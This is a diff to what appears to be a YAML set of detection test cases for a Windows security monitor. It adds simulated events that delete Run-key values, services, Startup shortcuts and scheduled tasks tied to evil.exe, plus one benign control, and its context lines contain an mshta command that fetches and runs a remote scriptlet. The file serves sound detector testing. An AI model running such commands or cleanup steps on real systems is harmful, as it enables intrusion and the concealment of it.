@@ -60,3 +60,58 @@ cases:
         file:
           path: "C:\\Windows\\System32\\mshta.exe"
         cmd_line: 'mshta.exe javascript:a=GetObject("script:http://10.0.0.1/a.sct").Exec();close();'
+
+  - name: 删除 Run 键自启动值（擦痕迹，快照 diff 删除事件带旧值）
+    technique: T1070
+    source: atomic T1547.001 反向操作
+    class: 201002
+    os: windows
+    event:
+      activity_id: 4
+      reg_key:
+        path: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic"
+      reg_value:
+        data: "C:\\Users\\Public\\evil.exe"
+
+  - name: 删除恶意服务（快照 diff 删除事件）
+    technique: T1070
+    source: atomic T1543.001 反向操作
+    class: 201002
+    os: windows
+    event:
+      activity_id: 4
+      reg_key:
+        path: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\atomic"
+      reg_value:
+        data: "ImagePath=C:\\Users\\Public\\evil.exe; Start=2"
+
+  - name: 删除 Startup 目录快捷方式
+    technique: T1070.004
+    source: atomic T1070.004
+    class: 1001
+    os: windows
+    event:
+      activity_id: 4
+      file:
+        path: "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk"
+
+  - name: 删除计划任务文件
+    technique: T1070.004
+    source: atomic T1070.004
+    class: 1001
+    os: windows
+    event:
+      activity_id: 4
+      file:
+        path: "C:\\Windows\\System32\\Tasks\\atomic"
+
+  - name: 删除普通下载文件（良性对照）
+    technique: T1070.004
+    source: 良性对照
+    class: 1001
+    os: windows
+    expect: undetected
+    event:
+      activity_id: 4
+      file:
+        path: "C:\\Users\\user\\Downloads\\old-build.zip"
